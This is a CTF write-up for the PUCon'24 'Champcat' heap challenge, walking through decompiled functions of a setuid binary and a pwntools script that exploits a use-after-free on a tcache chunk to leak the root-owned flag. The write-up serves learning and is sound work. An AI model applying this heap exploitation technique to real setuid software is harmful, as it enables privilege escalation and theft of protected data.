---
title: PUCon' 24 - Userspace - Champcat
date: '2024-2-17'
tags: ['pucon', 'userspace', 'ctf', 'pwn', 'heap', 'uaf', 'chunk-reuse']
draft: false
summary: Utilizing Heap Use-After-Free to load the flag into user-controlled chunk and read it.
---

## Challenge Description

![challenge_desc](/static/writeups/pucon24/image.png)

## Solution

This challenged was developed by `Αρσλάν` and it was a fairly simple heap challenge. Unfortunately, I was not able to solve it during the time frame of the competition.

> Since I'm fairly new (and learning) about the heap, I got confused with the provided description that it may be something related to safe-linking ;-;.

In this challenge, we were given a simple `champ_cat` binary and a `tcache.c` (which was later uploaded and only contained some calculations that we didn't end up using; maybe required for the intended solution?)

Let's first start out by checking the security mitigations on this binary:

![alt text](/static/writeups/pucon24/image-1.png)

Well, all the mitigations are enabled. Loading this binary up in a disassembler, we're greeted with the following functions:

![alt text](/static/writeups/pucon24/image-2.png)
![alt text](/static/writeups/pucon24/image-3.png)

Well, those are quite a lot of functions, let's start by analyzing `main`:

```c:main
void main(undefined4 param_1)

{
  welcome(param_1);
  do {
    print_menu();
  } while( true );
}

```

Looking at the welcome function, we have a simple `banner` printing function. Looking at the `print_menu` function, we can see the actual `heap-challenges-styled` menu:

```c:menu
void print_menu(void)

{
  long in_FS_OFFSET;
  char local_11;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  help();
  printf("\nchamp_cat > ");
  __isoc99_scanf(&DAT_00103755,&local_11);
  switch(local_11) {
  case 'c':
    close_file();
    getchar();
    break;
  case 'd':
    lift_curse();
    getchar();
    break;
  default:
    puts("\n[+] Prof Champ hates it when people make mistakes.");
    break;
  case 'f':
    read_flag();
    getchar();
    break;
  case 'l':
    print_open_list();
    getchar();
    break;
  case 'm':
    curse_buffer();
    getchar();
    break;
  case 'n':
    open_new_file();
    getchar();
    break;
  case 'p':
    file_printer();
    getchar();
    break;
  case 'q':
                    /* WARNING: Subroutine does not return */
    exit(0);
  case 'u':
    update_curse_buffer();
    getchar();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now, we have quite a lot of functions. Some seem pretty nice, some; not so much. Let's start by checking what `open_new_file` does:

```c:open_new_file
void open_new_file(void)

{
  ssize_t sVar1;
  void *pvVar2;
  uint uVar3;
  long in_FS_OFFSET;
  uint local_30;
  uint local_2c;
  int local_28;
  int local_24;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nEnter the slot number to add entry : ");
  __isoc99_scanf(&DAT_001033df,&local_30);
  printf("Enter the file name: ");
  sVar1 = read(0,filelist + (ulong)(local_30 % 10) * 0x1010 + 4,0x1000);
  local_28 = (int)sVar1;
  filelist[(ulong)(local_30 % 10) * 0x1010 + (long)(local_28 + -1) + 4] = 0;
  printf("\n\t[+] Opening the file : %s\n",(ulong)(local_30 % 10) * 0x1010 + 0x105084);
  local_24 = open(filelist + (ulong)(local_30 % 10) * 0x1010 + 4,0);
  if (local_24 < 0) {
    perror("open");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  *(int *)(filelist + (ulong)(local_30 % 10) * 0x1010) = local_24;
  printf("Enter Number of bytes for the summary : ");
  __isoc99_scanf(&DAT_001033df,&local_2c);
  uVar3 = local_30 % 10;
  pvVar2 = malloc((ulong)local_2c);
  *(void **)(filelist + (ulong)uVar3 * 0x1010 + 0x1008) = pvVar2;
  read(local_24,*(void **)(filelist + (ulong)local_30 * 0x1010 + 0x1008),(ulong)local_2c);
  lseek(local_24,0,0);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now, as much daunting as it looks, it really isn't that bad. Firstly, it asks the user for a slot number (what is that?) then, it asks for a file namea nd popens that file. Then asks the user for the size of bytes to read from that file (summary), and then reads it to an offset inside the `filelist`. What is this filelist?

Well, `filelist` was a simple array stored on the stack that held information about a file at each specific index with an offset of `0x1010`. A `structure` of filelist could be interpreted as follows:

```c:file
typedef struct {
    int fd;
    char* file_name;
    char* summary;
}PUCON_FILE;

PUCON_FILE filelist[10];
```

> This isn't an accurate struct, this is just what I understood, if I'm wrong, do hit me up on discord and help me understand as I'm still learning, ty uwu.

Now, here we can see a few bugs. There aren't any checks for what files we can open, nor any checks on how many bytes we can allocate for the summary buffer. 

TL;dr for this function, we can open a file, allocated a buffer for it's content and read the content in it's buffer.

Now, this will be our write-to-memory primitive. Now, let's look for a read primitive (write-to-stdout). We can see that, if we press `l`, we can see a `print_open_list` function:

```c:print_open_list

void print_open_list(void)

{
  uint local_c;
  
  puts("\n[+] List of the open files");
  for (local_c = 0; (int)local_c < 10; local_c = local_c + 1) {
    printf("\n[+] fileptr # %u\n",(ulong)local_c);
    printf("\tfd : %u\n\tfilename : %s\n\tSummary : %s",
           (ulong)*(uint *)(filelist + (long)(int)local_c * 0x1010),
           (long)(int)local_c * 0x1010 + 0x105084,
           *(undefined8 *)(filelist + (long)(int)local_c * 0x1010 + 0x1008));
    printf("\n\tsummaryPtr: %p\n",*(undefined8 *)(filelist + (long)(int)local_c * 0x1010 + 0x1008));
  }
  return;
}
```

This function is will give us the the `read` primitive. This will simply print all the information in the `filelist`. Just similar to this function, I saw another function called: `read_and_print_file`, the decompilation for that is:

```c:read_and_print_file
undefined8 read_and_print_file(int param_1)

{
  iovec *__iovec;
  void *pvVar1;
  ssize_t sVar2;
  undefined8 uVar3;
  int local_40;
  int local_3c;
  int local_38;
  ulong local_30;
  ulong local_28;
  
  local_40 = get_file_size(param_1);
  local_30 = (ulong)local_40;
  if (local_40 < 0) {
    local_40 = local_40 + 0xfff;
  }
  local_40 = local_40 >> 0xc;
  if ((local_30 & 0xfff) != 0) {
    local_40 = local_40 + 1;
  }
  __iovec = (iovec *)malloc((long)local_40 << 4);
  local_3c = 0;
  for (; local_30 != 0; local_30 = local_30 - local_28) {
    local_28 = local_30;
    if (0x1000 < (long)local_30) {
      local_28 = 0x1000;
    }
    pvVar1 = malloc(0x1000);
    __iovec[local_3c].iov_base = pvVar1;
    __iovec[local_3c].iov_len = local_28;
    local_3c = local_3c + 1;
  }
  sVar2 = readv(param_1,__iovec,local_40);
  if ((int)sVar2 < 0) {
    perror("readv");
    uVar3 = 1;
  }
  else {
    for (local_38 = 0; local_38 < local_40; local_38 = local_38 + 1) {
      output_to_console(__iovec[local_38].iov_base,__iovec[local_38].iov_len);
    }
    free(__iovec);
    uVar3 = 0;
  }
  return uVar3;
}
```

What this function does, is read the data of that file into a buffer, and utilizes the `readv` syscall and utilizes another local function called `output_to_console` to print information about the file. Well, first thing that came into my mind, after looking at just these functions was, can't we just read `flag.txt` and display the file contents and get it? To answer my own question, I saw another function, called `read_flag`.

```c:read_flag
void read_flag(void)

{
  int __fd;
  void *__dest;
  
  if (flag < 1) {
    setuid(0);
    flag = flag + 1;
    __fd = open("/flag",0);
    perror("opening the flag: ");
    __dest = malloc(0x100);
    printf("\n[+] Address of the flag buffer is %p\n",__dest);
    memcpy(__dest,"This is the flag and here you go : ",0x23);
    read(__fd,(void *)((long)__dest + 0x23),0xdd);
    seteuid(1000);
    close(__fd);
  }
  else {
    puts("\n\tNah Nah Prof champ knows what you are doing...\n");
  }
  return;
}
```

After looking at the function, I got the answer; I just couldn't read the file as the current binary would be running as `SETUID` on the remote and the `flag` would be owned by `root` and only be allowed to be `read` using this function as this function firstly sets the `setuid` bit 0, then reads the flag into a `dynamic` buffer of size `0x100` (this will come in handy later), and then sets the setuid back to `1000` and closes the fd. 

Now, to sum it up, we have a read primitive, where we can allocate a chunk in memory of size that we control, we can print the data stored in the allocated chunk to stdout, and we can load the flag in a `malloc`'ed chunk of size `0x100`. Now, we're getting the hang of the exploit we can try and do, `load` any file that exists on the system (let's just say `/dev/urandom`) and then set the summary size to `0x100`, then `close` the file (`free`ing the chunk that we allocated), and then load the flag in the `free`'d chunk of the same size as the flag i.e. `0x100`. Let's firstly take a look at the `close` function i.e. `close_file`:

```c:close_file
void close_file(void)

{
  long in_FS_OFFSET;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nEnter the file slot number : ");
  __isoc99_scanf(&DAT_001033df,&local_14);
  local_14 = local_14 % 10;
  close(*(int *)(filelist + (ulong)local_14 * 0x1010));
  memset(filelist + (ulong)local_14 * 0x1010 + 4,0,0x1000);
  free(*(void **)(filelist + (ulong)local_14 * 0x1010 + 0x1008));
  *(undefined8 *)(filelist + (ulong)local_14 * 0x1010 + 0x1008) = 0;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Now, what this does essentially is simply closes the file descriptor, the empties the corresponding file name using `memset`, and the frees the chunk in memory and `NULL` out the data on that specific address.

Now when I'm writing this, I understood where I went wrong. I did not read this line carefully `*(undefined8 *)(filelist + (ulong)local_14 * 0x1010 + 0x1008) = 0;`. What line is essentially doing, is zero-ing out the space in the `filelist` that contains address to the chunk that contains the `summary`.

What I kept trying, was, reading the file `/dev/urandom` with a size of `0x100`, and then closing the file, then loading the flag, and then I kept trying to print out the filelist, but it just wasn't working. Well, now I understand why.

So, I'm still going to use the basic concept that I just told (which doesn't work tho) and write a basic exploit that we'll slowly start building upon:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
getleak = lambda delim: int(io.recvregex(delim+b"([^;]*)\n").split()[-1], 16)
def recvlineafter(d): io.recvuntil(encode(d)); return io.recvline()

exe = "./champ_cat"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main")

def open_file(slot, name, sz):
	io.sendlineafter(b">", b"n")
	io.sendlineafter(b":", encode(slot))
	io.sendlineafter(b":", encode(name))
	io.sendlineafter(b":", encode(sz))

def read_flag():
	io.sendlineafter(b">", b"f")
	leak = getleak()
	info("flag @ %#x" % leak)

def print_list(end=b"="):
	io.sendlineafter(b">", b"l")
	data = io.recvuntil(end)[:-1]
	print(data.decode())

def print_file(slot, end=b"="):
	io.sendlineafter(b">", b"p")
	io.sendlineafter(b":", encode(slot))
	data = io.recvuntil(end)[:-1]
	print(data.decode())

def close_file(slot):
	io.sendlineafter(b">", b"c")
	io.sendlineafter(b":", encode(slot))

open_file(0, "/dev/urandom", 0x100)
close_file(0)

io.interactive()
```

Now, let's attach gdb to this and check the `bins` and the heap:

![alt text](/static/writeups/pucon24/image-4.png)
![alt text](/static/writeups/pucon24/image-6.png)

Now, we can see that the `/dev/urandom`'s random data is stored on the heap and since we closed the file, this specific chunk now lies in the tcache. However, the first few bytes of this chunk's data section are NULLED out:

![alt text](/static/writeups/pucon24/image-5.png)

However, let's still try and load the flag:

![alt text](/static/writeups/pucon24/image-7.png)

> NOTE: We get a `Operation not permitted` due to the `setuid(0)` function call, but the flag is still read.

We can see, that the address that flag is stored on corresponds to the address of the free'd filelist slot 0 summary chunk. Analyzing the heap now:

![alt text](/static/writeups/pucon24/image-8.png)

Our flag, resides on the heap now. But, before moving forward and trying to read this, let's firstly see the `filelist` in memory:

![alt text](/static/writeups/pucon24/image-9.png)

Now, for the index 0, the offset would be `base+0`:

![alt text](/static/writeups/pucon24/image-10.png)

Taking a closer look, we can see that only the first byte contains the `fd` of the file that was opened. No other data is stored. So, our try to read the flag would fail because the address where the pointer to the chunk where the summary would be stored is nulled out. If we try and print the file list now:

![alt text](/static/writeups/pucon24/image-11.png)

We get a bunch of nulls. So, that was a fail. There are other functions, let's try those and see. Looking at the menu, we see some functions that have the word `curse` in them:

![alt text](/static/writeups/pucon24/image-12.png)

Let's start by taking a look at the `Allocate the curse buffer`. The decompilation of that function is:

```c:curse_buffer

void curse_buffer(void)

{
  if (curse_buffer_data == (void *)0x0) {
    puts("\n[+] This is the curse buffer you can add your curses for the prof champ");
    printf("\nEnter the curse buffer size : ");
    __isoc99_scanf(&DAT_001033df,&curse_bytes);
    curse_buffer_data = malloc((ulong)curse_bytes);
    printf("\n[+] Address of the curse buffer : %p\n",curse_buffer_data);
    printf("Write Down your curses for prof champ : ");
    read(0,curse_buffer_data,(ulong)curse_bytes);
  }
  else {
    puts("\n\tNah Nah Prof champ knows what you are doing...\n");
    puts("[+] Don\'t allocate a lot of memory it\'s useless you really deserver F");
  }
  return;
}
```

Well, we have a global variable called `curse_buffer_data` which is a simple `char*`, and another `curse_bytes`. Now, what this function basically does, is ask the user for the size you want to allocate, and allocates using `malloc`, and not `calloc`, which is good for our cause and then just simply asks for data that we'd like to write inside that buffer.

Let's take a look at `remove the curse buffer`:

```c:lift_curse
void lift_curse(void)

{
  puts("\n\tHAHAHAHA Surrendering to the Prof Champ ? I am Champ accept the defeat.");
  free(curse_buffer_data);
  return;
}
```

In this function, all we have is a simple `free`. Meaning, we can simply free the `curse_buffer_data` chunk. Taking at look at the last function:

```c:update_curse_buffer
void update_curse_buffer(void)

{
  printf("\nEnter the Number of bytes : ");
  __isoc99_scanf(&DAT_001033df,&curse_bytes);
  printf("Enter new curse :");
  read(0,curse_buffer_data,(ulong)curse_bytes);
  return;
}
```

This is the function that I spent some time on and I kept trying to overflow the heap (which I did) but didn't know what do after that due to my limited knowledge about the heap.

What I essentially was trying to do:

- Allocate the buffer
- Open a new file
- Read the flag
- Update the buffer and overflow to the point I reach the metadata of the chunk of `summary`.
- Overwrite the size field of the chunk of to extend to the flag.

I was successful in overflowing and overwriting the `size` field, however, `GLIBC's` mitigations were just a little too much for me at this stage.

> I knew I was onto something, but at this point, I hadn't slept in more than 24 hours and decided to prioritize sleep over this competition, and just a few hours before writing this writeup, I woke up, and solved the challenge (the competition was over by then but I'd prefer learning over the competition anyways.)

Okay, so now let's recall the exploit we did before:

- We opened the file, allocated a chunk of size `0x100`
- Closed the file
- Read the flag (as the flag allocates `0x100`)

But the problem of the `summary` field being nulled out when the file was closed? Well, what if; instead of allocating a new chunk for summary, we use `curse_buffer_data`.

So, the exploitation steps now become:

- Allocating the buffer to size `0x100`
- Freeing the buffer (goes to the tcache bin)
- Opening a new file and setting the summary buffer to be `0x100`
- Freeing the buffer again. (This will once again go to the tcache bin)
- Reading the flag (This will allocate the chunk on the tcache)
- Printing the list.

Now, why would this work? Because we aren't closing the file and the address of the summary pointer would exist inside the `filelist`. So, let's go through this, step by step:

### Allocating the buffer to size `0x100` and freeing it

```py:exploit.py
def allocate_buffer(sz, data):
	io.sendlineafter(b">", b"m")
	io.sendlineafter(b":", encode(sz))
	leak = getleak(b": ")
	info("cursed buffer @ %#x" % leak)
	io.sendlineafter(b":", encode(data))

allocate_buffer(0x100, "ashfaq-the-goat")
```

Now, let's also, free this chunk by invoking the `free_buffer` function:

```py:exploit.py
def free_buffer(): io.sendlineafter(b">", b"d")

free_buffer()
```

Let's check the state of the heap:

![alt text](/static/writeups/pucon24/image-14.png)

Now, we can see that the chunk we allocated, ended up in the `tcache bin` after it was freed.

### Opening a new file and setting the buffer to size `0x100` and freeing the `curse` chunk

```py:exploit.py
open_file(0, "/dev/urandom", 0x100)
```

Checking the heap state:

![alt text](/static/writeups/pucon24/image-15.png)

Now, our free'd chunk was allocated for the `summary` and also, stored on the `filelist`. Let's check the filelist:

![alt text](/static/writeups/pucon24/image-16.png)

We can see that `filelist+0x1008`, now points to the chunk that we allocated. Now, let's free this chunk:

```py:exploit.py
free_buffer()
```

![alt text](/static/writeups/pucon24/image-17.png)

The chunk once again ended up inside the `tcache bin`. Let's analyze the `filelist` and see if the summary buffer still points to a valid address:

![alt text](/static/writeups/pucon24/image-18.png)

The `filelist` points directly to the chunk that we just freed.

### Reading the flag file

Let's read the flag file and check the state of the heap:

![alt text](/static/writeups/pucon24/image-19.png)

Now, our flag was written in the same buffer that we had just free'd. Let's see if the same address resides in `filelist+0x1008`

![alt text](/static/writeups/pucon24/image-20.png)

Perfect. The last thing that we need to is:

### Printing the file to stdout:

For that, we already have two functions, `print_list` and `print_file`. Let's invoke the `print_file` function for a more cleaner output:

![alt text](/static/writeups/pucon24/image-21.png)

Now, the `readv` syscall is giving an error about `invalid argument`, so we'll make use of the `print_list` function:

![alt text](/static/writeups/pucon24/image-22.png)

Well, this worked like a charm. Let's further clear out the input and the final exploit becomes (removing all unnecessary functions):

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
getleak = lambda delim: int(io.recvregex(delim+b"([^;]*)\n").split()[-1], 16)
def recvlinenafter(d): io.recvuntil(encode(d)); return io.recvline()

exe = "./champ_cat"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main")

def open_file(slot, name, sz):
	io.sendlineafter(b">", b"n")
	io.sendlineafter(b":", encode(slot))
	io.sendlineafter(b":", encode(name))
	io.sendlineafter(b":", encode(sz))

def read_flag():
	io.sendlineafter(b">", b"f")
	leak = getleak(b"is ")
	info("flag @ %#x" % leak)

def print_list():
	io.sendlineafter(b">", b"l")
	io.recvuntil(b"you go : ")
	flag = io.recvuntil(b"}").decode()
	info("FLAG: %s" % flag)

def allocate_buffer(sz, data):
	io.sendlineafter(b">", b"m")
	io.sendlineafter(b":", encode(sz))
	leak = getleak(b": ")
	info("cursed buffer @ %#x" % leak)
	io.sendlineafter(b":", encode(data))

def free_buffer(): io.sendlineafter(b">", b"d")

allocate_buffer(0x100, "ashfaq-the-goat")
free_buffer()
open_file(0, "/dev/urandom", 0x100)
free_buffer()
read_flag()
print_list()
```

![alt text](/static/writeups/pucon24/image-23.png)

Now, let's run this on the remote:

![alt text](/static/writeups/pucon24/image-24.png)

Overall, a very good challenge and helped me brush up my skills on linux heap exploitation.

Also, shoutout to [stdnoerr](https://stdnoerr.github.io/) for being the only one in this competition to solve all the challenges, the guy is actually one of the nicest guys and an amazing pwner (probably the best in Pakistan) and shoutout to [papadoxie](https://papadoxie.github.io/) for putting up these amazing challenges. I will write the writeups for the Kernel challenges once I'm done with the heap stuff that I'm currently learning.